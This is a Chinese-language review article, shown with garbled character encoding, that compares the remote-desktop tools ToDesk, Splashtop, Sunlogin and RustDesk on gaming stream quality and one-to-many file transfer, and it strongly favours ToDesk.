<p>â— <strong>å‘æ—¥è‘µ</strong>ï¼šæ‹¥æœ‰æ·±åšç”¨æˆ·åŸºç¡€ä¸ç¡¬ä»¶ç”Ÿæ€çš„è¿œç¨‹æ§åˆ¶è½¯ä»¶ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afc7cd5b1de241129b012cac071c18bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=CYvWQpKpS%2FgiKwdIDx8eytn7nkA%3D" alt="" loading="lazy"/></p>
<p>â— <strong>Splashtop</strong>ï¼šåœ¨ä¸“ä¸šä¸ä¼ä¸šçº§å¸‚åœºå£ç¢‘å“è‘—çš„æ€§èƒ½æ ‡æ†ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/785db57a85494b5190efc6198b117369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=FRU%2F3S0g1NpGI4gCKqrlDdMiQvE%3D" alt="" loading="lazy"/></p>
<p>â— <strong>RustDesk</strong>ï¼šå¼€æºè‡ªå»ºé¢†åŸŸçš„æ˜æ˜Ÿï¼Œæ‹¥æœ‰ç€é«˜åº¦è‡ªå®šä¹‰çš„å¯èƒ½æ€§ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7a0b512f2ea489489889b8085af1567~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=b%2Bja1fYa3DGBfmPTsc1OXn2yXXM%3D" alt="" loading="lazy"/></p>
<p/>
<p/>
<h2 data-id="heading-0"><strong>ä¸€ã€****æµ‹è¯„ç»´åº¦ä¸€ï¼šæé™ç”»è´¨ä¸æµç•…åº¦ </strong></h2>
<p>æˆ‘ä»¬é€‰æ‹©åœ¨å—æ§ç«¯è¿è¡Œå¼€æ”¾ä¸–ç•Œææ€–ç”Ÿå­˜æ¸¸æˆã€ŠThe Forestã€‹ã€‚è¿™æ¬¾æ¸¸æˆæ ¸å¿ƒä½“éªŒä¾èµ–äºæ˜æš—æ£®æ—çš„å…‰å½±å˜åŒ–ã€å¿«é€Ÿç§»åŠ¨æ¢ç´¢çš„æµç•…åº¦ï¼Œä»¥åŠä¸é‡äººéƒ¨è½é­é‡æˆ˜æ—¶çªç„¶çš„è§†è§’è½¬åŠ¨å’Œæˆ˜æ–—æ“ä½œã€‚è¿™æ­£è´´åˆäº†è¿œç¨‹æ§åˆ¶ä¸­â€œé«˜åŠ¨æ€ç”»é¢â€å’Œâ€œä½æ“ä½œå»¶è¿Ÿâ€ä¸¤å¤§ä¸¥è‹›è€ƒéªŒã€‚æµ‹è¯•åœ¨4Kåˆ†è¾¨ç‡ã€é«˜ç”»è´¨é¢„è®¾ä¸‹è¿›è¡Œï¼Œé‡ç‚¹è¯„ä¼°åœ¨ä¸›æ—å¥”è·‘ã€å¿«é€Ÿè½¬èº«æŸ¥çœ‹ç¯å¢ƒç­‰åœºæ™¯ä¸‹çš„åŠ¨æ€æµç•…åº¦ã€æš—éƒ¨ç»†èŠ‚ä¿ç•™ï¼Œä»¥åŠè‡³å…³é‡è¦çš„â€œè·Ÿæ‰‹æ€§â€ã€‚</p>
<p/>
<h3 data-id="heading-1"><strong>ToDesk<strong><strong> 2026æ–°ç‰ˆ</strong></strong>æœ¬<strong><strong>ï¼šåˆ·æ–°è®¤çŸ¥çš„â€œ8K360</strong></strong>å¸§****â€æŠ€æœ¯åˆä½“éªŒï¼š</strong></h3>
<p>é¦–å…ˆåœ¨ç™»å½•è¿‡åï¼Œåœ¨è®¾ç½®é¡µé¢UIå…¨é¢æ”¹ç‰ˆï¼Œåˆ†ç±»æ›´æ¸…æ™°ï¼Œæ–°æ‰‹å¿«é€Ÿä¸Šæ‰‹å¼•å¯¼ï¼Œä¸€é”®å¿«é€Ÿè°ƒæ•´ï¼Œè‡ªå®šä¹‰ä¼˜åŒ–å‚æ•°ï¼Œæ»¡è¶³ä¸åŒåœºæ™¯ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07b07f1ca0284ca39627b439fbae52b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=WZc7xF3bmNLu%2BU%2BywpT%2BnwJrIqc%3D" alt="" loading="lazy"/></p>
<p>ä¸ä»…å¦‚æ­¤ï¼Œæ–°å¢é¢„è®¾ä¿å­˜åŠŸèƒ½ï¼Œå¯é’ˆå¯¹ç‰¹å®šè®¾å¤‡ä¿å­˜ç”»è´¨ã€åˆ†è¾¨ç‡ã€æ¯”ä¾‹ã€è¢«æ§é™éŸ³ã€æœ¬æœºæ’­æ”¾è¢«æ§å£°éŸ³ç­‰è®¾ç½®ï¼Œä¸‹æ¬¡è‡ªåŠ¨åº”ç”¨ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1af26dcebd51405d9311ba1c919e9796~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=iAGO%2FzXerwdGYXcNrKkJmAscNEk%3D" alt="" loading="lazy"/></p>
<p>åœ¨å…¨éƒ¨è®¾ç½®å¥½ä¹‹åï¼Œæˆ‘ä»¬å¼€å§‹è¿æ¥ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24ad3205f88f4eb0b6174b6e4a119b23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=wd%2BIH2%2B3CTK2ikCNCF921urOtqA%3D" alt="" loading="lazy"/></p>
<p>å¼€å¯é«˜æ€§èƒ½æ¨¡å¼æˆ–æ¸¸æˆæ¨¡å¼ï¼Œå¯ä»¥å°†åˆ·æ–°ç‡è°ƒåˆ¶360Hz</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ff8bf0e44df4303805f9c8326e2c83b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=%2Br9lRezp3A2bJp2I5go4qoPUBaA%3D" alt="" loading="lazy"/></p>
<p>è®¾ç½®å¥½ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å»¶æ—¶ä¸º3msï¼Œå¸§ç‡ä¸º351fps</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9670ef6c3edb4830abb8891ae49e35c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=n9tIm0XOpymrgEIO4swKD%2BR4cAY%3D" alt="" loading="lazy"/></p>
<p>- <strong>ç”»è´¨ä¸è®¾ç½®ä¼˜åŒ–</strong>ï¼šåœ¨â€œåŸç”»â€æ¨¡å¼ä¸‹ï¼Œæ¸¸æˆåœºæ™¯çš„æ¤è¢«çº¹ç†ã€æœ¨æç»†èŠ‚ä»¥åŠæ´ç©´å†…çš„é˜´å½±å±‚æ¬¡éƒ½å¾—åˆ°äº†æå¥½çš„è¿˜åŸï¼Œå‡ ä¹çœ‹ä¸åˆ°å› å‹ç¼©äº§ç”Ÿçš„è‰²å—ã€‚æ›´å…³é”®çš„æ˜¯ï¼Œå…¶æ–°ç‰ˆè®¾ç½®ç•Œé¢åˆ†ç±»æ¸…æ™°ï¼Œå¹¶æä¾›äº†<strong>è¿æ¥é¢„è®¾åŠŸèƒ½</strong>ã€‚ç”¨æˆ·å¯ä»¥ä¸ºå®¶ä¸­çš„æ¸¸æˆç”µè„‘å•ç‹¬ä¿å­˜ä¸€å¥—åŒ…å«â€œè¶…æ¸…ç”»è´¨â€ã€â€œçœŸå½©æ¨¡å¼ï¼ˆ4:4:4è‰²å½©é‡‡æ ·ï¼‰â€å’Œâ€œæé€Ÿåˆ·æ–°æ¨¡å¼â€çš„é…ç½®ï¼Œä¸‹æ¬¡è¿æ¥æ—¶è‡ªåŠ¨åº”ç”¨ï¼Œå®ç°äº†æ¸¸æˆåœºæ™¯çš„â€œä¸€é”®æœ€ä¼˜è®¾ç½®â€ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b083b785a9624bcdb9347824597d9bd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=BuTWF%2FlbKp%2BmTvPYqBRqs4Ib0eM%3D" alt="" loading="lazy"/></p>
<p>- <strong>æµç•…åº¦ä¸å»¶è¿Ÿ</strong>ï¼šå¼€å¯â€œæé€Ÿåˆ·æ–°æ¨¡å¼â€åï¼Œåœ¨ã€ŠThe Forestã€‹ä¸­å¿«é€Ÿè½¬èº«è§‚å¯Ÿå‘¨å›´ç¯å¢ƒï¼Œç”»é¢æ‹–å½±è¢«æŠ‘åˆ¶åˆ°æä½æ°´å¹³ã€‚ä¸»è§‚å»¶è¿Ÿæ„Ÿå¾®å¼±ï¼Œæ“ä½œè·Ÿæ‰‹ï¼Œè¾¾åˆ°äº†å¯æ²‰æµ¸æ¸¸ç©çš„çº§åˆ«ã€‚è¿™å¾—ç›Šäºå…¶å®£ç§°çš„ç«¯åˆ°ç«¯<strong>æ¯«ç§’çº§å“åº”ä¼˜åŒ–</strong>ï¼Œä»¥åŠæ™ºèƒ½ç½‘ç»œå¼•æ“åœ¨ç½‘ç»œè‰¯å¥½æ—¶è‡ªåŠ¨é‡‡ç”¨P2Pç›´è¿ï¼Œå‡å°‘ä¸­è½¬å»¶è¿Ÿã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02e4b854e2d14591acaa2b97723102a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=jKmfgHnvtA9xt0mSdFMpkNaFQ%2Fg%3D" alt="" loading="lazy"/></p>
<p>- <strong>æŠ€æœ¯ç‚¹ç›</strong>ï¼šå…¶â€œé¼ æ ‡åŠ é€Ÿé€šé“â€åŠŸèƒ½ä¸ºFPSæ¸¸æˆæä¾›äº†é«˜è¾¾8000Hzçš„è™šæ‹Ÿå›æŠ¥ç‡ï¼Œä½¿è¿œç¨‹é¼ æ ‡ç§»åŠ¨æ›´åŠ å¹³æ»‘è·Ÿæ‰‹ã€‚å¯¹äºã€ŠThe Forestã€‹è¿™ç±»éœ€è¦å¿«é€Ÿç²¾å‡†æ“ä½œçš„æ¸¸æˆï¼Œè¿™æ˜¯ä¸€ä¸ªéšæ€§çš„ä½“éªŒåŠ åˆ†é¡¹ã€‚å¯ä»¥çœ‹åˆ°æ¸¸æˆè¿‡ç¨‹ä¸­å§‹ç»ˆç»´æŒåœ¨300fpså·¦å³</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3da8276126f4e698be85361a2ad8c65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=mYHZ88qRDP02dNaCH444blvOcdc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2"><strong/></h3>
<h3 data-id="heading-3"><strong>Splashtopï¼šç¨³å¥å¯é çš„ä¸“å®¶ä¹‹é€‰</strong></h3>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/563deddcf6454db28f4a56e60adb1c34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=0XxaLIcxe9qIm6ecclpphyjMNuE%3D" alt="" loading="lazy"/></p>
<p>Splashtopåœ¨é«˜æ€§èƒ½è¿œç¨‹è®¿é—®é¢†åŸŸç´ æœ‰å£ç¢‘ï¼Œæœ¬æ¬¡æµ‹è¯•å°è¯äº†å…¶ç¨³å®šæ€§ã€‚</p>
<p>- <strong>ç”»è´¨</strong>ï¼šç”»é¢è¾“å‡ºç¨³å®šã€å¹²å‡€ï¼Œè‰²å½©å‡†ç¡®åº¦é«˜ï¼Œæ”¯æŒ4:4:4è‰²å½©æ¨¡å¼ï¼Œå¯¹äºéœ€è¦è‰²å½©ä¿çœŸçš„ä¸“ä¸šåœºæ™¯æ˜¯å…¶å¼ºé¡¹ã€‚åœ¨ã€ŠThe Forestã€‹çš„åŠ¨æ€åœºæ™¯ä¸­ï¼Œç”»è´¨æ‰å®ï¼Œä½†åœ¨æé™å¿«é€Ÿæ™ƒåŠ¨è§†è§’æ—¶ï¼Œèƒ½æ„Ÿè§‰åˆ°ç”»é¢æœ‰è½»å¾®çš„åŠ¨æ€æŸ”å’Œå¤„ç†ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9f160b2527b4913952bb97a92ea0046~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=TUl7j9fZ8IUzv9nsLiWsg%2Be7KRc%3D" alt="" loading="lazy"/></p>
<p>- <strong>æµç•…åº¦ä¸å»¶è¿Ÿ</strong>ï¼šè¡¨ç°éå¸¸ä¸€è‡´ï¼Œå¸§ç‡è¾“å‡ºå¹³ç¨³ã€‚æ“ä½œå»¶è¿Ÿç•¥é«˜äºToDeskï¼Œä½†åœ¨å¯æ¥å—èŒƒå›´å†…ã€‚å…¶ä¼˜åŠ¿åœ¨äº<strong>å“è¶Šçš„ç¨³å®šæ€§</strong>ï¼Œæ— è®ºåœºæ™¯å¦‚ä½•å˜åŒ–ï¼Œä½“éªŒæ³¢åŠ¨å¾ˆå°ï¼Œå¦‚åŒä¸€ä½å¯é çš„é©¬æ‹‰æ¾é€‰æ‰‹ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce4d85df711d4407ab52f9e76485b06d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=nLyujYS7PCnMotNkMMxlfWiEskQ%3D" alt="" loading="lazy"/></p>
<p>- <strong>ç»¼åˆè¯„ä»·</strong>ï¼šå¦‚æœè¿½æ±‚çš„æ˜¯ç¨³å®šã€æ— å¹²æ‰°çš„è¿œç¨‹æ¸¸æˆæˆ–å·¥ä½œç¯å¢ƒï¼ŒSplashtopæ˜¯ä»¤äººæ”¾å¿ƒçš„é€‰æ‹©ã€‚å®ƒå¯èƒ½éœ€è¦ç”¨æˆ·æ‰‹åŠ¨åœ¨è®¾ç½®ä¸­ç²¾ç»†è°ƒæ•´ä»¥è¾¾åˆ°æœ€ä½³æ¸¸æˆæ€§èƒ½ã€‚</p>
<p/>
<h3 data-id="heading-4"><strong>å‘æ—¥è‘µï¼šæ¸…æ™°è§é•¿ï¼ŒåŠ¨æ€ä¼˜åŒ–ä¸­</strong></h3>
<p>- <strong>ç”»è´¨</strong>ï¼šé™æ€åŠä½é€Ÿç”»é¢æ¸…æ™°ï¼Œå…¶â€œçœŸå½©æ¨¡å¼â€ä¹Ÿèƒ½å¾ˆå¥½åœ°è¿˜åŸè‰²å½©ã€‚åœ¨ã€ŠThe Forestã€‹çš„å»ºé€ ç•Œé¢æˆ–é™æ­¢è§‚å¯Ÿæ—¶ï¼Œç”»é¢ç»†èŠ‚ä¸°å¯Œã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c242f1a51e5744cc80d6ee3ac578711f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=Gxx1Njq3I%2B0cD5OTj5HRaxJyfUA%3D" alt="" loading="lazy"/></p>
<p>- <strong>æµç•…åº¦ä¸å»¶è¿Ÿ</strong>ï¼šç„¶è€Œï¼Œåœ¨æˆ˜æ–—æ—¶ï¼Œæµç•…åº¦ä¼šå‡ºç°å¯æ„ŸçŸ¥çš„æ³¢åŠ¨ï¼Œæœ‰ä¸€ç§â€œå¾®é¡¿â€æ„Ÿã€‚è¿™ä¸å…¶æ€§èƒ½æ¨¡å¼çš„è®¾è®¡é€»è¾‘æœ‰å…³ï¼šå®ƒæä¾›äº†â€œæ¸¸æˆä¼˜åŒ–æ¨¡å¼â€ï¼Œå…è®¸ç”¨æˆ·è‡ªå®šä¹‰å¸§ç‡ä¸å»¶è¿Ÿä¼˜åŒ–ï¼Œä½†å®é™…åŠ¨æ€æµç•…åº¦ä¸é¡¶å°–é€‰æ‰‹ä»æœ‰å·®è·ã€‚å…¶å¹³å‡å»¶è¿Ÿåœ¨æµ‹è¯•ä¸­é€šå¸¸é«˜äºToDeskå’ŒSplashtopã€‚</p>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" loading="lazy"/></p>
<p/>
<p/>
<h3 data-id="heading-5"><strong>RustDeskï¼šå¼€æºå¯æ§ï¼Œæ€§èƒ½éœ€è°ƒæ ¡</strong></h3>
<p>ä½œä¸ºå¼€æºæ–¹æ¡ˆï¼ŒRustDeskèµ‹äºˆäº†ç”¨æˆ·æé«˜çš„è‡ªä¸»æƒå’Œéšç§å®‰å…¨æ€§ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4389c12130e9478785f89bb762fa1fe3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=pK5gJclSSDXUuYA3zGCJcQteWNs%3D" alt="" loading="lazy"/></p>
<p>- <strong>ç”»è´¨ä¸æµç•…åº¦</strong>ï¼šåœ¨é»˜è®¤ä½¿ç”¨å…¬å…±æœåŠ¡å™¨çš„æ¡ä»¶ä¸‹ï¼Œå…¶ç”»é¢å‹ç¼©æ„Ÿååˆ†æ˜æ˜¾ï¼Œå¹¶ä¸”åœ¨å…è´¹çš„æœåŠ¡å™¨ä¸‹ï¼Œå¸¸å¸¸å‡ºç°æ‰çº¿çš„æƒ…å†µï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10d6470f10c846e29d8b639cf4c337c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=lzBatWAsYFvnC7t%2F4muVSz8lf8A%3D" alt="" loading="lazy"/></p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b67f990710745ab8342a684e97f8030~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=N%2BCqWlLKFKb58Rk6ZpKZlgYaZZI%3D" alt="" loading="lazy"/></p>
<p>éœ€è¦è‡ªå»ºæœåŠ¡å™¨æ‰èƒ½ç¨³å®šè¿è¡Œã€‚</p>
<p>- <strong>æ½œåŠ›ä¸é—¨æ§›</strong>ï¼šå®ƒçš„æ€§èƒ½é«˜åº¦ä¾èµ–äº<strong>è‡ªå»ºæœåŠ¡å™¨çš„è´¨é‡</strong>ã€‚æœ‰æŠ€æœ¯èƒ½åŠ›çš„ç”¨æˆ·é€šè¿‡æ­å»ºé«˜æ€§èƒ½ä¸­ç»§æœåŠ¡å™¨ã€å¯ç”¨ç¡¬ä»¶åŠ é€Ÿç¼–ç ï¼Œå¯ä»¥æ˜¾è‘—æå‡ä½“éªŒã€‚ä½†è¿™å¯¹æ™®é€šç”¨æˆ·è€Œè¨€é—¨æ§›è¾ƒé«˜ã€‚</p>
<p/>
<h3 data-id="heading-6"><strong>å°ç»“</strong></h3>
<p>åœ¨ã€ŠThe Forestã€‹è¿™ç±»èåˆäº†æ¢ç´¢ã€å»ºé€ å’Œçªç„¶æˆ˜æ–—çš„æ¸¸æˆä¸­ï¼Œè¿œç¨‹ä½“éªŒçš„ä¼˜åŠ£è¢«æ”¾å¤§ã€‚<strong>ToDesk**** å‡­å€Ÿå…¶åº•å±‚å¼•æ“çš„æ¿€è¿›ä¼˜åŒ–å’Œä¾¿æ·çš„åœºæ™¯é¢„è®¾ï¼Œåœ¨é«˜å¸§ç‡ã€ä½å»¶è¿Ÿçš„äº¤äº’ä½“éªŒä¸Šå»ºç«‹äº†æ˜¾è‘—ä¼˜åŠ¿</strong>ï¼Œæœ€èƒ½æ»¡è¶³ç©å®¶â€œæ²‰æµ¸å¼è¿œç¨‹æ¸¸ç©â€çš„éœ€æ±‚ã€‚Splashtopåˆ™ä»¥å¼ºç¨³å®šæ€§æˆä¸ºæ³¨é‡å¯é æ€§çš„ä¸“ä¸šç”¨æˆ·å’Œç©å®¶çš„åšå®åç›¾ã€‚å‘æ—¥è‘µæä¾›äº†æ¸…æ™°ä¸”åŠŸèƒ½å…¨é¢çš„æ–¹æ¡ˆï¼Œé€‚åˆå¤§å¤šæ•°éæé™ç«æŠ€çš„æ—¥å¸¸æ¸¸æˆåœºæ™¯ã€‚è€ŒRustDeskï¼Œåˆ™ä¸ºç‰¹å®šç¾¤ä½“æä¾›äº†ä»¥å¯æ§æ€§æ¢å–å¼€ç®±å³ç”¨ä½“éªŒçš„ç‹¬ç‰¹è·¯å¾„ã€‚</p>
<p/>
<p/>
<p/>
<h2 data-id="heading-7"><strong>äºŒã€****æµ‹è¯„ç»´åº¦äºŒï¼šä¸€å¯¹å¤šæ–‡ä»¶ç§’ä¼  </strong></h2>
<p/>
<p>æ–‡ä»¶ä¼ è¾“æ˜¯è¿œç¨‹æ§åˆ¶æœ€é«˜é¢‘çš„åŠŸèƒ½ä¹‹ä¸€ã€‚ä½†å½“éœ€è¦å°†åŒä¸€ä»½æ–‡ä»¶åˆ†å‘ç»™æ•°åã€æ•°ç™¾å°è®¾å¤‡æ—¶ï¼Œä¼ ç»Ÿâ€œç‚¹å¯¹ç‚¹â†’æ–­å¼€â†’é‡ç‚¹å¯¹ç‚¹â€çš„æ¨¡å¼å°±å˜æˆäº†æ•ˆç‡çš„é»‘æ´ã€‚æˆ‘ä»¬æ¨¡æ‹Ÿäº†ä¸€ä¸ªä¸­å°å‹ITå›¢é˜Ÿæœ€å…¸å‹çš„è¿ç»´åœºæ™¯ï¼Œæ£€éªŒè°èƒ½ç‡å…ˆè§£å†³è¿™ä¸€ç—›ç‚¹ã€‚</p>
<p/>
<h3 data-id="heading-8"><strong>ToDesk<strong><strong> 2026æ–°</strong></strong>ç‰ˆæœ¬****ï¼šé‡æ–°å®šä¹‰â€œæ‰¹é‡â€æ“ä½œ</strong></h3>
<p>è¿™æ— ç–‘æ˜¯ToDeskæœ¬æ¬¡æ›´æ–°ä¸­æœ€å…·æ€ä¼¤åŠ›çš„åŠŸèƒ½ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚</p>
<p>â— <strong>æ“ä½œæµç¨‹</strong>ï¼šæå…¶ç®€æ´ã€‚åœ¨ToDeskçš„è®¾å¤‡åˆ—è¡¨ç•Œé¢ï¼Œåªéœ€ç‚¹å‡»â€œå¿«ä¼ æ–‡ä»¶â€ï¼Œä¾¿è¿›å…¥ä¸€ä¸ªä¸“é—¨çš„å¤šè®¾å¤‡ä¼ è¾“é¢æ¿ã€‚ç”¨æˆ·åƒåœ¨èµ„æºç®¡ç†å™¨ä¸­é€‰æ‹©å¤šä¸ªæ–‡ä»¶ä¸€æ ·ï¼Œ<strong>è½»æ¾å‹¾é€‰éœ€è¦æ¥æ”¶æ–‡ä»¶çš„è¿œç«¯è®¾å¤‡ï¼ˆæ”¯æŒæŒ‰åˆ†ç»„ç­›é€‰ï¼‰</strong>ï¼Œç„¶åæ‹–å…¥æˆ–é€‰æ‹©éœ€è¦å‘é€çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»â€œå‘é€â€å³å¯ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43cfaf96073e45c4a10cf4b7fd672189~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=om40CDiHE3ZQLXIib8dgbF4txRA%3D" alt="" loading="lazy"/></p>
<p>â— <strong>æ•ˆç‡è¡¨ç°</strong>ï¼šä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œç•Œé¢æ¸…æ™°åˆ—å‡ºæ‰€æœ‰ç›®æ ‡è®¾å¤‡ï¼Œå„è‡ªæ˜¾ç¤ºè¿›åº¦æ¡ã€ä¼ è¾“é€Ÿåº¦ã€å‰©ä½™æ—¶é—´ï¼Œä»»ä½•ä¸€å°ä¸­æ–­ä¸å½±å“å…¶ä»–è®¾å¤‡ã€‚</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94af4546c0e149eaa390b9e2c3b15f59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=168k%2BmZuXam7CdltCTK6Sx%2FpwdU%3D" alt="" loading="lazy"/></p>
<p>â— <strong>æ ¸å¿ƒä»·å€¼</strong>ï¼šå®ƒå®ç°çš„ä¸ä»…ä»…æ˜¯é€Ÿåº¦å åŠ ï¼Œæ›´æ˜¯<strong>å·¥ä½œæµçš„æ ¹æœ¬æ€§é‡æ„</strong>ã€‚ç®¡ç†å‘˜å¯ä»¥ä»æœºæ¢°çš„é‡å¤æ“ä½œä¸­è§£æ”¾å‡ºæ¥ï¼Œåœ¨æ–‡ä»¶ä¼ è¾“çš„åŒæ—¶å¤„ç†å…¶ä»–äº‹åŠ¡ï¼Œå®ç°äº†çœŸæ­£çš„â€œæ‰¹é‡æ— äººå€¼å®ˆè¿ç»´â€ã€‚</p>
<p/>
<h3 data-id="heading-9"><strong>å‘æ—¥è‘µ/Splashtop/RustDeskï¼šä»åœ¨ä¼ ç»Ÿèµ›é“ç«é€Ÿ</strong></h3>
<p>è¿™ä¸‰æ¬¾è½¯ä»¶ç›®å‰å‡æœªæä¾›åŸç”Ÿçš„ä¸€å¯¹å¤šæ–‡ä»¶ä¼ è¾“åŠŸèƒ½ã€‚</p>
<p>â— <strong>æ“ä½œæµç¨‹</strong>ï¼šç”¨æˆ·å¿…é¡»æ‰§è¡Œä¸‰æ¬¡å®Œæ•´çš„é—­ç¯æ“ä½œï¼šå»ºç«‹è¿œç¨‹è¿æ¥ï¼ˆæˆ–æ‰“å¼€æ–‡ä»¶ä¼ è¾“çª—å£ï¼‰â†’æ‰¾åˆ°å¹¶é€‰æ‹©æ–‡ä»¶â†’å¼€å§‹ä¼ è¾“â†’ç­‰å¾…å®Œæˆâ†’æ–­å¼€ã€‚è¿™æ˜¯ä¸€ä¸ªçº¿æ€§ã€ä¸å¯å¹¶è¡Œçš„æ—¶é—´çº¿ã€‚</p>

